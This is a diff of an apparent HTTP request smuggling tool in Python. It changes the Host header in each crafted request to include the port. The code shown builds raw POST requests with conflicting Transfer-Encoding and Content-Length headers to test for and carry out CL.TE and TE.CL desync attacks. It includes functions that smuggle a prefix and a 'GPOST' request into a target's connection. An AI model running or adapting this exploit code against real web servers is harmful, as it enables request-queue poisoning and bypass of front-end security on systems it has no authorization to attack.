@@ -104,7 +104,7 @@ def is_vulnerable(target, te_header):
     # Test vulnerability to CL.TE attack
     try:
         query(target, f'POST {target.path} HTTP/1.1\r\n'
-                      f'Host: {target.host}\r\n'
+                      f'Host: {target.host}:{target.port}\r\n'
                       f'{te_header}\r\n'
                        'Content-Length: 4\r\n'
                        '\r\n'
@@ -124,7 +124,7 @@ def is_vulnerable(target, te_header):
     # Test vulnerability to TE.CL attack
     try:
         query(target, f'POST {target.path} HTTP/1.1\r\n'
-                      f'Host: {target.host}\r\n'
+                      f'Host: {target.host}:{target.port}\r\n'
                       f'{te_header}\r\n'
                        'Content-Length: 6\r\n'
                        '\r\n'
@@ -141,7 +141,7 @@ def is_vulnerable(target, te_header):
 def cl_te_smuggle(target, smuggle):
     cl = len(smuggle) + 5           # account for inserted zero-length chunk
     query(target, f'POST {target.path} HTTP/1.1\r\n'
-                  f'Host: {target.host}\r\n'
+                  f'Host: {target.host}:{target.port}\r\n'
                    'Transfer-Encoding: chunked\r\n'
                   f'Content-Length: {cl}\r\n'
                    '\r\n'
@@ -157,7 +157,7 @@ def te_cl_smuggle(target, smuggle):
                 '\r\n')
     cl = len(smuggle_len) + 2       # account for '\r\n'
     query(target, f'POST {target.path} HTTP/1.1\r\n'
-                  f'Host: {target.host}\r\n'
+                  f'Host: {target.host}:{target.port}\r\n'
                    'Transfer-Encoding: chunked\r\n'
                   f'Content-Length: {cl}\r\n'
                    '\r\n'
@@ -177,7 +177,7 @@ def main():
 '''
     cl_te_smuggle(target, 'G')
     te_cl_smuggle(target, f'GPOST / HTTP/1.0\r\n'
-                          f'Host: {target.host}\r\n'
+                          f'Host: {target.host}:{target.port}\r\n'
                            'Content-Length: 50\r\n'
                            '\r\n')
 '''
